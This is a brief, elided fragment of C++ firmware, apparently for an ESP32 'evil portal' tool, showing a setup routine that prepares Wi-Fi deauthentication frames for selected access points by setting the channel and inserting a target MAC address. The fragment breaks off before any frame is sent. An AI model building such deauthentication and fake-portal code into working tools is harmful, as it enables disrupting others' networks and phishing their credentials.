...
uint8_t deauth_frame[sizeof(deauth_frame_packet_2)];
...
bool EvilPortalAddtional::apSetup(bool _deauth) {
    ...
    for (int i = 0; i < access_points->size(); i++) {
        if (access_points->get(i).selected) {
            if (_deauth) {
                memcpy(deauth_frame, deauth_frame_packet_2, sizeof(deauth_frame_packet_2));
                esp_wifi_set_channel((int)access_points->get(i).channel, WIFI_SECOND_CHAN_NONE);
                vTaskDelay(50 / portTICK_PERIOD_MS);
                memcpy(&deauth_frame[4], _deauth_target, 6);
